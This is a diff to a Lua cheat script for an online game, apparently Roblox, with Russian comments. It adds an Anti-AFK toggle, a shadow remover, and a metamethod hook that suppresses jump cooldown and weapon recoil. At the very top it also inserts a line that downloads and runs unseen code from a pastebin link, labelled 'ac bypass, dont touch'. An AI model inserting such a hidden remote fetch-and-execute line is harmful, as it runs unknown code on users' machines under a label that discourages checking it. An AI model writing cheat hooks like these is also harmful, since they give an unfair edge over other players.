@@ -1,4 +1,5 @@
--- Загрузка библиотеки
+loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))()
+-- ac bypass, dont touch
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/libtests/refs/heads/main/library"))()
 
 -- Создание кастомной ватермарки
@@ -198,7 +199,6 @@ local tabs = {
     Movement = win:tab{name = "Movement"},
     Visuals = win:tab{name = "Visuals"},
     Misc = win:tab{name = "Misc"},
-    Other = win:tab{name = "Other"},
     Config = win:tab{name = "Config"}
 }
 
@@ -207,6 +207,20 @@ local misc_sections = {
     camera = tabs.Misc:section{name = "Camera", side = "left"},
     extras = tabs.Misc:section{name = "Extras", side = "right"}
 }
+
+-- Anti-AFK переменная и логика
+local antiAFK = {
+    Enabled = false,
+    VirtualUser = game:GetService("VirtualUser")
+}
+
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    if antiAFK.Enabled then
+        antiAFK.VirtualUser:CaptureController()
+        antiAFK.VirtualUser:ClickButton2(Vector2.new())
+        print("Anti-AFK prevented kick")
+    end
+end)
 
 -- Добавляем toggle для Infinity Zoom
 misc_sections.camera:toggle{
@@ -220,6 +234,109 @@ misc_sections.camera:toggle{
             -- Возвращаем стандартное значение при отключении
             game.Players.LocalPlayer.CameraMaxZoomDistance = 128
         end
+    end
+}
+
+-- Добавляем toggle для Anti-AFK
+misc_sections.extras:toggle{
+    name = "Anti-AFK",
+    flag = "anti_afk",
+    default = false,
+    callback = function(state)
+        antiAFK.Enabled = state
+    end
+}
+
+-- Disable Shadows
+local disableShadows = {
+    Enabled = false,
+    Thread = nil
+}
+
+local function remove_shadows()
+    local lighting = game:GetService("Lighting")
+    lighting.GlobalShadows = false
+    -- Удаляем объекты типа Shadow, если есть
+    for _, obj in ipairs(lighting:GetDescendants()) do
+        if obj:IsA("Shadow") or obj.Name:lower():find("shadow") then
+            pcall(function() obj:Destroy() end)
+        end
+    end
+end
+
+misc_sections.extras:toggle{
+    name = "Disable Shadows",
+    flag = "disable_shadows",
+    default = false,
+    callback = function(state)
+        disableShadows.Enabled = state
+        if state then
+            remove_shadows()
+            disableShadows.Thread = task.spawn(function()
+                while disableShadows.Enabled do
+                    task.wait(5)
+                    remove_shadows()
+                end
+            end)
+        else
+            disableShadows.Enabled = false
+            -- Возвращаем тени обратно
+            local lighting = game:GetService("Lighting")
+            lighting.GlobalShadows = true
+        end
+    end
+}
+
+-- NoJumpCD
+local noJumpCD = {
+    Enabled = false
+}
+
+-- NoRecoil
+local noRecoil = {
+    Enabled = false
+}
+
+-- Глобальный хук для NoJumpCD (ставим только один раз)
+do
+    local old_newindex = nil
+    old_newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
+        -- NoJumpCD: блокируем изменение JumpPower только если включено
+        if noJumpCD.Enabled and not checkcaller() and game.IsA(self, "Humanoid") and Index == "JumpPower" then
+            return
+        end
+        -- NoRecoil: блокируем изменение CFrame камеры только если включено
+        if noRecoil.Enabled then
+            local callingScr = getcallingscript()
+            local function isframework(scriptInstance)
+                return tostring(scriptInstance) == "Framework"
+            end
+            local function checkArgs(instance, index)
+                return tostring(instance):lower():find("camera") and tostring(index) == "CFrame"
+            end
+            if isframework(callingScr) and checkArgs(self, Index) then
+                return
+            end
+        end
+        return old_newindex(self, Index, Value)
+    end)
+end
+
+misc_sections.extras:toggle{
+    name = "NoJumpCD",
+    flag = "no_jump_cd",
+    default = false,
+    callback = function(state)
+        noJumpCD.Enabled = state
+    end
+}
+
+misc_sections.extras:toggle{
+    name = "NoRecoil",
+    flag = "no_recoil",
+    default = false,
+    callback = function(state)
+        noRecoil.Enabled = state
     end
 }
 
